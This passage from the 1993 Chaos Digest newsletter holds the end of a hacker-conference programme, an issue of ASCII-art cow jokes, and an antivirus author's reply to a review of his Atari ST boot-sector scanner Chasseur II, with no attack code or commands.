   How high a data rate can you pump through the air, and what is still
   legal?

Social Engineering
   The Dude, well known from his articles in Hack-Tic, will teach you
   the basics of social engineering, the skill of manipulating people
   within burocracies.

'Hacking Plastic'
   Tim and Billsf talk about the security risks in chip-cards, magnetic
   cards, credit cards and the like.

Antenna Host Demo
   The Antenna Foundation is setting up and supporting computer
   networks, mainly in the South. They are operating a host system in
   Nijmegen, The Netherlands, and they will demonstrate it in this
   workshop, and talk about their activities.

APS Demo
   APS (Activist Press Service) is operating a bbs in Amsterdam, The
   Netherlands. You'll see it and will be able to play with it
   'hands-on'.

'Hocking the arts'
   Benten and Marc Marc are computer artists. They present some of their
   work under the motto: Hocking the arts, demystifying without losing
   its magic contents.

Public Unix Demo
   Demonstrating the Hack-Tic xs4all public unix, as well as other
   public unix systems.

Packet Radio Demo
   Showing the possiblities of existing radio amateur packet radio
   equipment to transport packets of data over the airwaves.


COMPUTERS AT 'HACKING AT THE END OF THE UNIVERSE'
+-------------------------------------------------

This will get a little technical for those who want to know what we're
going to set up. If you don't know much about computers, just bring
whatever you have and we'll see how and if we can hook it up.

We're going to have ethernet connected to Internet (TCP/IP). You can
connect by sitting down at one of our PC's or terminals, by hooking up
your own equipment (we have a depository, so don't worry about theft),
or by using one of our 'printerport <--> ethernet' adapters and
hooking up laptops and notebooks that way. There may be a small fee
involved here, we don't know what they're going to cost us. Contact us
for details, also if you have a few of these adapters lying around.
There might also be serial ports you can connect to using a nullmodem
cable.

You can log in to our UNIX system(s) and send and receive mail and
UseNet news that way. Every participant that wants one can get her/his
own IP number to use worldwide. Users of the network are urged to make
whatever files they have on their systems available to others over the
ethernet. Bring anything that has a power cord or batteries and let's
network it!

------------------------------

End of Chaos Digest #1.32
************************************

Chaos Digest             Lundi 24 Mai 1993        Volume 1 : Numero 33
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.33 (24 Mai 1993)
File 1--A la vache... (humour)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives.  They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Mon May 10 12:44:28 +0200 1993
From: dufour_s@galaxie.int-evry.fr (Stephane Dufour )
Subject: File 1--A la vache... (humour)


[ChaosD: Suite a notre rencontre du mardi 11 mai a l'Institut National des
Telecommunications (INT) d'Evry, M. Dufour nous a communique son compte-rendu
de notre conference sur "la securite des systemes d'information" dans un
style tres personnel.]


             --==>>  THE COMPLETE GUIDE TO COWS  <<==--
                  as you've NEVER seen them before!
                   ________________________
          (__)    /                        \         * OFFICIAL EDITION *
          (oo)   (  November 1989 Version!  )
   /-------\/  --'\________________________/      * WORLDWIDE DISTRIBUTION
  / |     ||
 *  ||----||             Edited by Mar
    ^^    ^^             Please send your submissions to:
     Cow                ewtileni@pucc.Princeton.EDU // ewtileni@pucc.BITNET


          (__)             (__)             (__)             (__)
          (oo)             (oo)             (oo)             (oo)
   /-------\/-*     /-------\/       /-------\/   ~~~~~~~~~~~~~~~~~~~~~
  / |     || \     )*)(\/* /  *     / |     ||
 *  ||----||  *   \ |||/)|/()(    ~~~~~~~~~~~~~~
 \/|(/)(/\/(,,/   \)|(/\/|)(/\
   Cow munching   Grass munching   Cow in water       Cow in trouble
     on grass         on cow

           (__)             (__)    *        (__) *      (__)
           (oo)             (oo)     \       (oo) |      (oo)
   /--------\/      /-oooooo-\/       \-------\/  \-------\/
  * o|     ||      * ooooooooo     o  o|     ||   /     ||
     ||----||     ooooooooooooo        ||----||>==/-----||
  ooo^^    ^^    ooooooooooooooooo     ^^    ^^         ^^
   Cow taking      Cow in deep         Cow getting the shit
     a shit            shit             kicked out of her

          (__)
          (oo)                       U
   /-------\/                    /---V
  / |     ||                    * |--|                       .
 *  ||----||
    ^^    ^^
 Cow at 1 meter.         Cow at 100 meters.        Cow at 10,000 meters.

          (__)                     )__(                vv    vv
          (oo)                     (oo)                ||----||  *
   /-------\/               *-------\/                 ||     | /
  / |     ||               / |     ||                 /\-------/
 *  ||----||              /  ||----||                (oo)
    ^^    ^^                 vv    vv                (~~)

 American Cow              Polish Cow            Australian Cow

          (__)                     (__)                     (__)
          (oo)                ____ (oo)                _---_(oo)
   /-------\/               /-    --\/               /-     -\/
  / |     ||               / |     ||               /|      ||
 *  ||----||              *  ||___-||              *  ||___-||
    ^^    ^^                 ^^    ^^                 ^^    ^^

 Freshman Cow at          Freshman Cow             Freshman Cow
 start of school     After the "Freshman 15"    After the "Freshman 20"

          (__)                     (__)                     (__)
          (OO)                     (@@)                     (xx)
   /-------\/               /-------\/               /-------\/
  / |     ||               / |     ||               / |     ||
 *  ||----||              *  ||----||              *  ||----||
    ^^    ^^                 ^^    ^^                 ^^    ^^

 Cow who drank Jolt       Cow who ate              Cow who used Jolt to was
                      psychadelic mushrooms      down psychadelic mushrooms

                                          /\                  __
                                         /  \                 ||
              (__)                 (__)  \  /               (_||_)
              SooS                 (oo)   \/                 (oo)
       /------S\/S          /-------\/    /S          /-------\/
      / |     ||           / |     ||    /  S        / |     ||
     *  ||----||          *  ||----||___/    S      *  ||----||
        ^^    ^^             ^^    ^^                  ^^    ^^
     This cow belonged     Ben Franklin owned       Abe Lincoln's
   To George Washington       this cow                   cow

                                                  (__)
          *        (__)                           (oo)
           \       (oo)                     /------\/
            \-------\/                     /|  |/  |
             | ==$ ||                     / |  [) ||
             ||----||                    *  ||----||
             ^^    ^^                       ^^    ^^
      Old "One Arm" belonged           This cow was given to
        to Ceasar's Palace           Hugh Hefner for his Birthday

                   (___)               (__)      (__)
                   ( O )               (oo)      (oo)
            /-------\ /                 \/--------\/
           / |     ||V                   |        |
          *  ||----||                    ||------||
             ^^    ^^                    ^^      ^^
   The cyclops that Jason and         This cow lived with
 the Argonauts met had this cow          Dr. Doolittle

              (__)                   (__)
              [##]                   (@o)
       /-------\/             /-------\/              /-------  (__)
      / |     ||             / |     ||              / |     || (oo)
     *  ||----||            *  ||----||             *  ||----|---\/
        ^^    ^^               ^^    ^^                ^^    ^
 This cow belonged      This cow lived with      This cow belonged to
   to Flash GOrdon       the Little Rascals       the Headless Horseman

                 (____)               (____)                        (____)
                 (oo  )               (o  o)                        (O  O)
      /-----------\  /          /-----\    /----          /-----------\/
     / ||       |  \/          / |   |  \/   |           / ||       |\/
    /  ||       ||||           \ |  |      | | |        /  ||       ||||
   *   ||||-----||||            *| | |-----| | |       *   ||||-----||||
       /\/\     /\/\             /\ /\     /\ /\           ^^^^     ^^^^
  This cow belonged         This was Salvatore    No one was sure whether
  to Pablo Picasso        Dali's favorite cow  M.C. Escher's cow had four
                                                        legs or eight

                O__O                             \_|_/
                (oo)                             (oo)
         /-------\/                       /-------\/
        / |     ||                       / |     ||
       *  ||----||                      *  ||----||
          ^^    ^^                         ^^    ^^
     Cow at Disneyland         Cow visiting the Statue of Liberty

                         (__)                        (__)
                 ^^      (oo)                        (--)
             ^^^^ /-------\/                        /-\/-\
          ^^^^^  / |     ||                        /|    |\
        ^^^^^   *  ||----||                       ^ |    | ^
     ^^^^^^^^  ====^^====^^====                     |    |
 ^^^^^^^^^^^^^/                                     /----\
 ^^^^^^^^^^^^^^^^^^                                /    \ \
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^               ^      * ^
      Cow Hanging Ten at Malibu           Cow sunning at Fort Lauderdale
                                              (What a bod, huh guys?)

                )\               (__)
               /  \              (oo)
         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            Cow swimming at Amityville
 (Where Jaws was filmed, for those less educated)

         *                                                 (__)
          \                                                (DD)
           \                                        /-------\/
           |\                                      / |     ||_\_/
         \ | \ (__)                               *  ||----|
         \\|| \(oo)                                  ^^    ^
          \||\ \\/                         Cow chugging brews and staring at
           ^^ \||                            sunbathers at Fort Lauderdale
            \\ ||
             \\||
              \||
               ^^
                \\_
                 \_
  Cow skiing a Black Diamond at Aspen

                        O O                 O O
                         \ \               / /
                          \ \          (__) /
           (__)            \ \         (xx)/
           (DD)             \ +--------+\//
    /-------\/               \|        | /
   / |     ||                 +--------+
  *  ||----||
     ^^    ^^
 Cow fantasizing about "Riding the Mechanical Bull"
             at Gillies in Texas

          o  o
          |__|               (__)             (__)
          (oo)               (oo)            =(oo)=         oo
   /-------\/         /-------vv       /-------\/
  / |     ||         / |     ||       / |     ||
 *  ||----||        *  ||----||      *  ||----||
    ~~    ~~           ~~    ~~         ~~    ~~
 bill bixby          bela lugosi      boris karloff  claude rains
 Male relative cow   cow              cow            cow

                        x
                    xxxx|xxxx
                 xxxxxxx|xxxxxxx
                        |
                       //
                 (__) //                        (__)   (__)
                 (oo)//                         (oo)===(oo)
          /-------\//                    /-------\/     \/-------\
         / |     |//                    / |     ||       ||     | \
        *  ||----|                     *  ||----||       ||----||  *
           ^^    ^^                       ^^    ^^       ^^    ^^
      Julie Andrews Cow                         Siamese cows

                             o        o             (__)    ^
                              \      /              (oo)   /
                               \    /           _____\/___/
              (__)              \__/           /  /\ / /
              (oo)       _______(oo)          ^  /  * /
     /---------\/       /|  ___  \/             / ___/
    / | x=a(b)||       / | {   }||         *----/\
   *  ||------||      *  ||{___}||             /  \
      ^^      ^^         ||-----||            /   /
                         ^^     ^^           ^    ^

     Mathematical        Television      This cow does Disco
         Cow                 Cow        (That's what comes of
    (developer of        (Cow-thode      snorting cow-caine)
      cow-culus)          Ray Tube)

                 (__)
                ([][])            "I have this recurring dream
                __\/_--U              about golden arches."..  (__)
               /\    \__                                 ^  :..("")
              /\\\  /  /                         //\  ____\_____\/ //
             /----^/__/\ /\                     // \\/     \___ / //
                 \\\____/--\--                 // /-/__________/ //
                  /======   \/            =======/==============//
               *_/ /    \   /^              //  /              \\
                  /      \ ^               //                   \\

                      Psycowlogist and patient

                                                (___)
           \^^^^^^^^\   (__)                    (o o)
            \^^^^^^^^\\ (oo)                     \ /
         *-----\_______\/\/                    \--O--/
       ^_______/   ---  \______^              // -----\
      ^--------\   \S/  /\_____^              \\/_^{} /==V===[]
                \______/                        \_____\\//
                                                 \__/
    It's a bird...                               //\\         The Boss
    It's a plane...                             //  \\   (Bruce Holstien)
                                               //   //
                                              ^^    ^^
                                           ==================
  _____________________________            H                H
  |             |-------------|            H     (__)       H
  |             |   ________  |            H     (oo)       H       __
  |   COWNTY    |  | (|__|) | |            H    / \/ \      H     /    \
  |    JAIL     |  |  |oo|  | |            H   | |  | |     H    | STOP |
  |             |  |__|\/|__| |            H   D===b=-----  H     \ __ /
  |             | o           |            H^^^^^^^^^^^^^^^^H       ||
  |             | ^           |            H                H       ||
  |             | ]           |            H                H       ||
  |             |             |            H                H       ||
  |_____________|_____________|            H                H       ||
                                           ^^^^^^^^^^^^^^^^^^     ^^^^^^^
  Some cows get in trouble...                 Cattle Guard

      (  (    )
    ( (     )   )
    ( (         )
   (           / )
  ( ( \\       )
      ( |  // )
        |   |    (__)
        |   |    (oo)                   (__)
        |   | ----\/              ______(oo)_____
        |   |    ||              ( _)_______(__) )
     ``'---------^^
         cow Hide                     Cow Pie

                    \  |  /         ___________
     ____________  \ \_# /         |  ___      |       _________
    |            |  \  #/          | |   |     |      | = = = = |
    | |   |   |  |   \\#           | |`v'|     |      |         |
    |            |    \#  //       |  --- ___  |      | |  || | |
    | |   |   |  |     #_//        |     |   | |      |         |
    |            |  \\ #_/_______  |     |   | |      | |  || | |
    | |   |   |  |   \\# /_____/ \ |      ---  |      |         |
    |            |    \# |+ ++|  | |  |^^^^^^| |      | |  || | |
    |            |    \# |+ ++|  | |  |^^^^^^| |      | |  || | |
 ^^^|    (^^^^^) |^^^^^#^| H  |_ |^|  | |||| | |^^^^^^|         |
    |    ( ||| ) |     # ^^^^^^    |  | |||| | |      | ||||||| |
    ^^^^^^^^^^^^^________/  /_____ |  | |||| | |      | ||||||| |
         `v'-                      ^^^^^^^^^^^^^      | ||||||| |
          || |`.      (__)    (__)                          ( )
                      (oo)    (oo)                       /---V
               /-------\/      \/ --------\             * |  |
              / |     ||        ||_______| \
             *  ||W---||        ||      ||  *
                ^^    ^^        ^^      ^^
                         "Cow Town"
               \ (__)                       (__)
               \\(oo)                       (\/)
          /-----\\\/                 /-------\/
         / |    (##)                / |     ||
        *  ||----||"               *  ||----||
           ^^    ^^                   ~~    ~~
     This cow plays bagpipes.      Cow from Beijing

          (__)                     (__)                     (__)
          (\/)                     ($$)                     (**)
   /-------\/               /-------\/               /-------\/
  / | 666 ||               / |=====||               / |     ||
 *  ||----||              *  ||----||              *  ||----||
    ^^    ^^                 ^^    ^^                 ^^    ^^

 Satanic cow           This cow is a Yuppie         Cow in love

          (__)                                              (__)
          (oo)                                              (oo)
   /-'''''-\/                            /-------------------\/
  / |'''''||                            / |                 ||
 *  ||''''||                           *  ||----------------||
    ^^    ^^                              ^^                ^^
  Cow in Argyle                                Stretch Cow
                         *
                       **   **
                  * **  * * *  **
                 *   /  /   \ *  *
              \  \ /  \        / /                         (__)
           *  /  / \  \  (__)  \ \                /--------(00)
             /           (00)  / /               / |      |(  )
             \    /-------\/   \ \              *  ||---- ||()
             /   / |     ||    / /                 ||     ||
           \ \  *  ||----||    \ \                 ^^     ^^
          /  /     ^^    ^^    / /            Cow Chewing Marbles
                  Cow in Heat

          (__)                 \__\                 (__)
          (oo)             o   (oo)                 (oo)
   /-------\/           ____\___\/          *+-------\/
  / |     ||           / |     ||           ||______||
 *  ||----||          *  ||----||             ||----||
    OO    OO             OO    OO             OO    OO
 Detroit cow          Mustang cow            pickup cow

                  (__)              (__)              \_||_~
                  (oo)              (oo)              (*||*)
   /---------------\/           /----\/        /-------\||/
  / |             ||           /    ||        / |     ||
 *  ||------------||        *-||----||       *  ||----||
    OO            OO          OO    OO          OO    }{
      li-moo-cow          fastback cow      teenager's cow

          ____
         (____)
                                .xxxx.
          (__)                  '(oo)`
          (oo)            /-----'-\/ `
   /-------\/            / |    |============>
  / |     ||            *  ||----| (~)
 *  ||----||               ~~    ~
    ~~    ~~             Moo-ammar Cowdafi
    holy cow            armed and dangerous

          (___)             (___)
          (o o)             (o o)
   /-------\ /       /-------\ /
  / |     ||O       / |  O~ ||O
 *  ||,---||       *  ||,---||
    ^^    ^^          ^^    ^^
     A Bull       A-bomb-in-a-bull     No-bull

            (---)
            (   )
           /-----\                          (___)
           |     |                          (o o)
           |  |  |                   (-----) \ /
           |  |  |                  /  / \    O
           |  *  |                 *  | O |
           ^^   ^^                    -----
           Coward                  Phone Bull

  |    |                              |    |           *
  |    |            (__)              |    |            \       (__)
  |    |            (oo)              |    |             \      (oo)
  |    |     /-------\/               |    |          -----------\/--
  |    |    / |     ||                |    |          ----|      |---
  |    |   *  ||----||                |    |              --------
  |    \______^^____^^___             |    \_________________
  |     _________________             |     _________________
  |    /                              |    /
  |    |                              |    |
  |    |                              |    |
  |    |                              |    |
  |    |                              |    |
  |    |                              |    |
  |    |                              |    |
  |    |                              |    |
 /      \                            /      \

 Cow perched on a tree.              Cow attempting to fly off tree.

  |    |
  |    |
  |    |
  |    |
  |    |
  |    \_________________
  |     _________________
  |    /
  |    |
  |    |
  |    |
  |    |
  |    |
  |    |                                (__)
  |    |                      *---------(..)
 /      \                        ^^----^^\/

 Cow that has failed miserably in the attempt.

   .            /\         .       .        :                (__)
         .     /  \      .          .       :                (xx)
              /    \   .        .    *      :         __------\/
             /      \              *        :        * ||____||
             | (__) |   .    .   **         :         / |    |\
      .     /| (oo) |\           **         :
           / | /\/\ | \   .     . *         :         Hamburger
       .  /  |=|==|=|  \     .      *       :
      . /    | |  | |    \  .               :
       / USA | ^||^ |NASA \     .           :       *        (__)
      |______|  ^^  |______|       .        :        \       (oo)
     .       (__||__)     .   .             :         \-------\/
        .    /_\  /_\  .     .    .         :        8-|     ||
             !!!  !!!                       :          ||----||
                                            :          ^^    ^^
   The cow that jumped over the moon.       :         Flying Cow

                           ...---...
                        ../  / | \  \..
                      ./ /  /  |  \  \ \.
                     /  /   /  |  \   \  \
                    /  /   /   |   \   \  \
                    ^^^^^^^^^^^^^^^^^^^^^^^
                    \          |          /
                     \         |         /
                      \        |        /
                       \       |       /
                        \      |      /
                         \     |     /
                          \    |    /
                           \   |   /
                            \  |  /
                             \ | /(__)
                              \|/ (oo)
                           /---++--\/
                          / |  || ||
                         *  ||-++-||
                            ^^    ^^
                Cow surviving attack by Red Baron

               ..---..                             (__)
              /       \                            (oo)
              |  RIP  |                     /-------\/
              |       |                    / |     ||
              |       |                   *  ||----||
              |       |                      ^^    ^^
 \\\\\\\\\\\\\\\\\/////////////////

             Elvis's Cow...      ...Or is it alive and living in tax exile???


                      (__)
                      (oo)
         /---+      +--\/
        / |  |      | ||
       *  ||-+      +-||
          ^^          ^^                             *

    David Copperfield's Cow               David Copperfield's other Cow

                                     (__)
                                     (oo)
                              /-------\/
                             / |     ||
                            *  ||----||
                               ^^    ^^
                              (__)  (__)
                              (oo)  (oo)
                       /-------\/    \/-------\
                      / |     || -^^- ||     | \
                     *  ||----   -^^-       ||  *
                        ^^                  ^^
                       (__)                (__)
                       (oo)                (oo)
                /-------\/                  \/-------\
               / |     ||                    ||     | \
              *  ||----||                    ||----||  *
                 ^^    ^^                    ^^    ^^
                  Barnum's Troupe of performing cows

                     (__)                       _--------_
                     (oo)                      |__________|   BIG
              /-------\/                        XXXXXXXXXX    MAC
             / | 007 ||                         __________
            *  ||----||                        |_        _|
               ^^    ^^                          --------
        Cow licenced to kill      Enemy Cow after having met previous cow

                                                      (__)
                                                      (oo)
                                                     /'^^^-m
             (__)                                   / '' ` )
             (oo)    o     /| /|/|_                |      /|
            / \/    /    /      _ /                |  |  | |
           /  _\===^   ___\_____/___               |_____|_|
       ___|__/ |/\    (___________(_)               //|| ||
      *        ^ ^                                 *  ww ww

             Mrs. O'Leary's Cow                 Cow'nt Dracula

 *        (__)              (__)               (__)               (__)
  \       (oo)              (oo)               (oo)               (oo)
   \-------\/        /-------\/         /-------\/         /-------\/
   /|      |\       / /      \         / \      /         / \      \
  //||----||\\     * //------\\       *   \\--//         *   \\----\\
  ^ ^^    ^^ ^       ^        ^            ^  ^               ^     ^
 Cow walking         Cow jogging         Same cow        Cow breaking

           (__)
           (oo)                       (__) o       *     (__)
            \/                        (oo)/ "      |     (oo)
        ____| \____            /-------\/(__ o=o=o=|------\/
        ---/   --**           / |       /          |      |
     *____/    |___//        *  ||----||           ||----||
         //--------/            ^^    ^^           ^^    ^^
        //__                      Cow           Cow pooing
        Cow marching            standing

    Side      Front   Side   back                (___)Where's all the bulls!
    (__)      (__)    (__)   (__)                (O O)/
    ( oo      (oo)    oo )   (  )            ^  _/\ /\_  ^
    /\_|      /\/\    |_/\   /  \            \\/   O   \//

+----
                          Stephane DUFOUR
MAISEL II Chbre 5210                   Phone : 33.1.60.76.68.66
6, rue Charles Fourier                   Fax : 33.1.60.76.45.88
91011 Evry cedex                       Telex : 602 841 F
FRANCE                                E_mail : Dufour_s@galaxie.int-evry.fr

------------------------------

End of Chaos Digest #1.33
************************************

Chaos Digest             Lundi 24 Mai 1993        Volume 1 : Numero 34
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.34 (24 Mai 1993)
File 1--"Chasseur II" pour Atari (critique)
File 2--National Computer Virus Awareness Day, USA (fete nationale)
File 3--Security&Control of IT in Society_ 12-7 Aout 93 (conference)
File 4--S.A.M., le prochain bebe de France TELECOM (produit)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives.  They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Mon May 17 15:25:47 +0200 1993
From: internet!altair.univ-lyon1.fr!vido (vido )
Subject: File 1--"Chasseur II" pour Atari (critique)


Augustin VIDOVIC
Tour Panoramique
DUCHERE
69009 LYON
                                a       Jean-Bernard CONDAT
                                        B.P. 155
                                        93404 St-Ouen CEDEX

                        Bonjour;

        J'ai bien recu votre lettre du 13 mai 1993, et vous en remercie
vivement: vraiment, je n'aurais jamais pense recevoir un jour du courrier
me demandant mon avis au sujet d'une critique d'un de mes programmes...
Surtout un aussi vieux programme que le CHASSEUR II! Voila qui fait un
drole d'effet...

        Avant toute chose, je tiens a preciser que le CHASSEUR II date
de 1991, qu'il etait une evolution du CHASSEUR tout court, qui a suffit
aux debuts de l'evolution des boot-virus sur ATARI ST... Mais qu'il est
depasse et insuffisant depuis une bonne annee. En effet, de nouveaux virus
ont vu le jour, qui exploitent fort bien les failles du CHASSEUR II: ils
savent se rendre "invisibles" en memoire (du moins jusqu'a un certain point),
ils resistent fort bien a une reinitialisation ("a chaud", cependant) de
la machine, se rendent meme "invisibles" sur le disque (le systeme lit un
bootsecteur normal et inexecutable!), et changent de forme de facon
aleatoire a chaque reproduction. Ils sont indetectables par le CHASSEUR II,
et sont d'ailleurs etudies pour.

        C'est mon frere, Zvonimir, qui a cree ces nouveaux virus, afin de
m'obliger a creer un programme plus puissant (le besoin cree la fonction).
Attention, toutefois: cette nouvelle generation n'est jamais sortie de chez
nous! Il s'agissait juste d'un interessant defi intellectuel. Nous ne sommes
pas fous au point de diffuser un poison suffisamment puissant pour "tuer"
toute une gamme de machines (ATARI ayant deja du mal a vivre!).

        Donc, je vais commenter et corriger (en expliquant les corrections!)
la critique de M. Slade; mais cela n'a pas une bien grande importance: le
CHASSEUR III, son successeur, a corrige tous ses defauts (du moins, tous
ceux que nous avons pu remarquer a l'usage).

        Apres la critique, je vous joins en annexe le listing de README.VIR,
qui est le petit fichier accompagnant le logiciel, destine a etre lu avant
utilisation. Ceci afin de montrer que nulle part, il n'est dit que
l'operation de vaccination est reversible.

        J'espere que cela vous conviendra. Dans le cas contraire, je serais
heureux de completer tout point que j'aurais laisse dans l'obscurite.

        Je vous envoie cette lettre par courrier electronique, en utilisant
votre adresse jbcondat@attmail.com, et en esperant que cela vous parviendra
bien. Pourriez-vous me fournir quelques renseignements au sujet du
Chaos Computer Club? J'en ai entendu parler, mais je ne pensais pas y avoir
affaire un jour.

        Je n'ose vous demander plus d'informations, car pour le moment je
n'ai pas tres souvent acces a un terminal de la Toile ("Web Angels"-J.M. Ford)
a cause du fait que j'effectue a l'heure actuelle mon service militaire
(libere fin aout), et que je retourne seulement environ une ou deux fois par
mois a l'observatoire. Pour la suite, n'etant pas certain de pouvoir
continuer mes etudes, et ainsi de pouvoir acceder souvent au reseau, je
prefere ne pas risquer pour le moment de surcharger a nouveau le mailsystem
de image... Je me ferais sans doute taper sur les doigts! Sachez cependant
que je brule d'envie de faire connaissance avec d'autres bidouilleurs,
et que j'espere pouvoir prendre contact avec votre club tres bientot!

        Bien amicalement,

                                        A. VIDOVIC

        P.S.: Puisque vous avez rajoute "Av. Plateau" a l'adresse ecrite sur
l'enveloppe de votre lettre, c'est que vous avez verifie sur l'annuaire
notre existence; donc, vous avez notre numero de telephone. Que rien ne vous
empeche de nous contacter par telephone pour tout renseignement
complementaire.

[ChaosD: Nous avons appele ce cher bleu(e) bit(te) au +33 78359559 qui nous a
confie qu'en fonction des ventes de ses sharewares il reprendrai ou non ses
etudes. A l'heure actuelle, la perspective de reprendre sa licence de physique
parait pour lui la meilleure des solutions.]

+++++
> Of course no one will believe it, but this is *not* prompted by the recent
> spate of calls for Atari and Amiga stuff.  I recently had an opportunity to
> do some partial testing of some antivirals on other systems and took it.
> Unfortunately, the tests are not complete, and cannot be finished at this
> time due to the absence of a viable "test suite".  I have, however,
> attempted to give some indication of the shareware utilities I was able to
> round up, and have added the contact info to the CONTACTS.LST.
>
> Herewith, then, is the first.
>
> ATCHRSSR2.RVW   930430
>                               Comparison Review
>
> Company and product:
>
> A. & Z. Vidovic
> Tour Panoramique
> Duchere
> 69009 Lyon
> France
> Chasseur II
>
> Summary: Boot sector overwriter
>

> Cost  50 Fr (U$15)
>
> Rating (1-4, 1 = poor, 4 = very good)
>       "Friendliness"
>             Installation
>             Ease of use
>             Help systems
>       Compatibility
>       Company
>             Stability
>             Support
>       Documentation
>       Hardware required
>       Performance
>       Availability
>      Local Support
>
> General Description:
>
>                   Comparison of features and specifications
>
>
> User Friendliness
>
> Installation
>
> The files (at least BOOTBASE.DAT) *must* be installed in a directory called
> \CHASSEUR.II or else the program will not function.

This is intended to avoid a memory loss to CHASSEUR II: BOOTBASE.DAT is the
database file where are stored all the bootsectors archived by the users.

> Ease of use
>
> There are only three options in the main menu: check disk, vaccinate and
> check memory.  These are represented by icons, with no words.

The "check disk" option leads to a window containing the representation of
the current bootsector, its name and quality ("loader","antivirus" or "virus")
and another menu: read another disk, extract boot (make it executable as a
stand-alone program, appearing in directory list), archive bootsector in
database, maintain database, save database, kill bootsector, vaccinate disk.
The difference between "kill bootsector" and "vaccinate disk" is: "to kill" is
only to make it unexecutable at boot time (REVERSIBLE), and "to vaccinate" is
to overwrite bootsector with the Vaccine (a boot-time memory check-up and
cold-reset if the user wants to clean memory when in doubt): "vaccinate" is
IRREVERSIBLE.

The "maintain database" option leads to a secondary dialog box, which allows
the user to edit all the bootsectors names and qualities he wants to, and to
load the contents of a "virus killer" (commercial antiviral) library.

> Help systems
>
> None provided.

When a dangerous option is activated, an alert box inform the user of the
danger and asks for confirmation of the option.

> Compatibility
>
> Unknown [...]

The vaccinate option, although stated to be irreversible, seems not to harm
MS-DOS disks, since it adds a jump at the beginning, and adds a memory check
-up routine at the end. It's normal: the ATARI ST disk format is compatible
with MS-DOS disk format, except for "system" disks. (MS-DOS "system" disks,
of course, will no longer be bootable; but it has no importance: since the
ATARI ST are not IBM PC compatible, no PC user will run CHASSEUR II.)

> Company Stability
>
> Unknown.

The Vidovic brothers are not dead. Moreover: they are young and healthy!

> Company Support
>
> None provided.

A new version exists: CHASSEUR III.

> Documentation
>
> A README.VIR file state that they believe the program is simple enough that
> there is no need for documentation. This is generally true, but it is a pity
> that there is no more detail on some of the claims made for the program.
>
> System Requirements
>
> None stated.

Any kind of ATARI ST may run CHASSEUR II.

> Performance
>
Perfect if used correctly (with a machine booted with a vaccinated disk).

> This seems to be a tool for very technically literate users, aimed at boot
> sector infectors only.
>
> Local Support
>
> None provided.
>
> Support Requirements

> It is unlikely that even intermediate users would understand, say, the
> memory listings generated. However, it should be effective against boot
> sector infectors even in novice cases. (One should note that *all* of the
> Atari boot sector overwriting programs may damage certain self-booting
> disks.)
>
> copyright Robert M. Slade, 1993   ATCHSSR2.RVW   930430
>
> =============
>
> Vancouver      ROBERTS@decus.ca         | Life is
> Institute for  Robert_Slade@sfu.ca      | unpredicable:
> Research into  rslade@cue.bc.ca         | eat dessert
